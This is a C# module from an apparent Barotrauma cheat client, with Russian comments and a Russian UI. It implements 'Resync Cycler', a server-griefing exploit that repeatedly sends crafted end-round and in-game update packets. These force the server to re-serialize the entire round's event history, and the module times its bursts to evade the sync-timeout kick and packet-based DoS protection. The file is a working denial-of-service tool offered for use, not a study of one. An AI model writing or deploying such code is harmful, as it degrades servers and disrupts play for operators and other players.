using System;
using System.Collections.Generic;
using Barotrauma;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    // ============================================================
    //  RESYNC CYCLER (волна 458, ★★★ CPU/трафик-гриф сервера)
    //
    //  Пара пакетов БЕЗ гейтов и кулдаунов:
    //  1) ENDROUND_SELF (GameServer:986-989): голый байт заголовка →
    //     InGame=false + ResetSync() — весь прогресс синка стёрт.
    //  2) UPDATE_INGAME (GameServer:1330-1344): байт 2 + bool
    //     midroundSyncingDone=false → InitClientMidRoundSync(c) →
    //     UnreceivedEntityEventCount = uniqueEvents.Count (ВСЯ история
    //     событий раунда) → сервер РЕ-СЕРИАЛИЗУЕТ весь бэклог с нуля.
    //
    //  Каждый цикл = честный CPU+трафик сервера, растёт с длиной раунда.
    //  Рейт-лимита нет; DoSProtection считает пакеты — оба «дешёвые».
    //  Сам атакующий кикается по SyncTimeout — ЗАПУСКАТЬ КОРОТКИМИ
    //  ПУЛЬСАМИ (корутина: pulse → пауза → reconnect-валидность).
    //
    //  Пакеты:
    //   ENDROUND_SELF  = 1 байт заголовка (ничего больше)
    //   UPDATE_INGAME  = заголовок + bool midroundSyncingDone + pad
    //  (UPDATE_INGAME в раунде обычно содержит input-сегменты; пустой
    //   сегмент-таблица допустима — сервер читает только bool+pad до
    //   GameStarted-ветки, сегменты не требуются.)
    // ============================================================
    public class ResyncCyclerModule : CSModuleBase
    {
        public override string Id   => "resync_cycler";
        public override string Name => "Resync Cycler";
        public override string Description =>
            "Цикл ENDROUND_SELF + UPDATE_INGAME (458).\n\n" +
            "• Каждый цикл: сервер стирает твой прогресс синка и заново\n" +
            "  сериализует ВЕСЬ бэклог событий раунда (CPU + трафик)\n" +
            "• Стоимость растёт с длиной раунда — на длинных раундах жирнее\n" +
            "• Пульсный режим: N циклов, пауза, повтор — чтоб не кикнуло\n" +
            "  по SyncTimeout\n" +
            "• Ты на время синка выпадаешь из игры (видно лобби)";
        public override string Category => "exploit";

        // тайминги пульса: короткая серия + отдых (SyncTimeout не догонит)
        private const int   PulsesPerBurst = 3;
        private const float CycleInterval  = 1.5f;   // сек между циклами серии
        private const float BurstCooldown  = 25f;    // сек отдыха между сериями

        private static GUIMessageBox _box;
        private static GUITextBlock _status;
        private static int _uiSession;
        private static int _totalCycles;
        private static bool _running;
        private static bool _burstMode;

        public override string GetLabel() => _running ? "Resync Cycler [ВКЛ]" : "Resync Cycler 🔄";

        public override void OnClick()
        {
            if (_box != null) { CloseBox(); return; }
            Open();
        }

        private static void CloseBox()
        {
            _box?.Close();
            _box = null;
            _status = null;
            _uiSession++; // глушим корутины статуса
        }

        private static void Open()
        {
            if (GameMain.Client == null)
            {
                GUI.AddMessage("[Resync] Только в мультиплеере", Color.Orange);
                return;
            }

            _box = new GUIMessageBox(
                headerText: "RESYNC CYCLER",
                text: "",
                buttons: new LocalizedString[] { },
                relativeSize: new Vector2(0.55f, 0.5f));

            var content = _box.Content;
            content.ClearChildren();

            _status = new GUITextBlock(
                new RectTransform(new Vector2(0.97f, 0.2f), content.RectTransform),
                "Ты в раунде? Работает только IN GAME (InGame=true).",
                textAlignment: Alignment.CenterLeft, wrap: true,
                font: GUIStyle.SmallFont);
            _status.TextColor = new Color(120, 220, 255);

            AddBtn(content, "ОДИН цикл (ENDROUND → UPDATE_INGAME)", new Color(150, 90, 50), () =>
            {
                SendCycle();
                return "цикл отправлен — сервер перечитывает бэклог";
            });

            AddBtn(content, "ПУЛЬС: 3 цикла + пауза 25с (бесконечно)", new Color(170, 60, 60), () =>
            {
                if (_running) { StopPulse(); return "пульс остановлен"; }
                StartPulse();
                return "пульс запущен — следи за пингом/CPU сервера";
            });
        }

        private static void AddBtn(GUIComponent parent, string text, Color color, Func<string> action)
        {
            var btn = new GUIButton(
                new RectTransform(new Vector2(1f, 0.16f), parent.RectTransform), text);
            btn.Color = color;
            btn.OnClicked = (b, d) =>
            {
                try
                {
                    string result = action();
                    GUI.AddMessage("[Resync] " + result, color);
                    if (_status != null)
                    {
                        _status.Text = "циклов отправлено: " + _totalCycles + (_running ? " | пульс активен" : "");
                    }
                }
                catch (Exception e)
                {
                    GUI.AddMessage("[Resync] " + e.Message, Color.Red);
                }
                return true;
            };
        }

        private static void StartPulse()
        {
            _running = true;
            _burstMode = true;
            _uiSession++;
            CoroutineManager.StartCoroutine(PulseLoop(_uiSession));
        }

        private static void StopPulse()
        {
            _running = false;
            _uiSession++;
        }

        // Пульс-корутина: серия циклов, пауза, повтор. Пока окно закрыто/модуль
        // выключен — корутина умирает сама (session-гейт).
        private static IEnumerable<CoroutineStatus> PulseLoop(int session)
        {
            double wait = 0.0;
            while (_running && session == _uiSession)
            {
                yield return CoroutineStatus.Running;
                if (Timing.TotalTime < wait) { continue; }

                // валидность: клиент, кампания/раунд
                if (GameMain.Client == null || !GameMain.Client.InGame)
                {
                    StopPulse();
                    GUI.AddMessage("[Resync] не в игре — пульс остановлен", Color.Orange);
                    yield break;
                }

                // серия из PulsesPerBurst циклов с CycleInterval
                for (int i = 0; i < PulsesPerBurst && _running && session == _uiSession; i++)
                {
                    SendCycle();
                    _totalCycles++;
                    wait = Timing.TotalTime + CycleInterval;
                    while (Timing.TotalTime < wait && _running && session == _uiSession)
                    {
                        yield return CoroutineStatus.Running;
                    }
                }

                // отдых: даём серверу прожевать и сами не ловим SyncTimeout
                if (_status != null)
                {
                    _status.Text = "циклов: " + _totalCycles + " | отдых " + (int)BurstCooldown + "с...";
                }
                wait = Timing.TotalTime + BurstCooldown;
                while (Timing.TotalTime < wait && _running && session == _uiSession)
                {
                    yield return CoroutineStatus.Running;
                }
            }
        }

        // ---- пакеты ----

        private static void SendCycle()
        {
            var peer = GameMain.Client?.ClientPeer;
            if (peer == null) return;

            // 1) ENDROUND_SELF: только заголовок (GameServer:986 читает НИЧЕГО —
            //    сразу InGame=false + ResetSync)
            IWriteMessage leave = new WriteOnlyMessage();
            leave.WriteByte((byte)ClientPacketHeader.ENDROUND_SELF);
            peer.Send(leave, DeliveryMethod.Unreliable);

            // 2) UPDATE_INGAME: bool midroundSyncingDone=false + pad
            //    (GameServer:1331: !midroundSyncingDone → InitClientMidRoundSync
            //     = весь uniqueEvents-бэклог снова в очередь сериализации)
            IWriteMessage join = new WriteOnlyMessage();
            join.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
            join.WriteBoolean(false);
            join.WritePadBits();
            peer.Send(join, DeliveryMethod.Unreliable);
        }

        public override void Dispose()
        {
            _running = false;
            _uiSession++;
            base.Dispose();
        }
    }
}
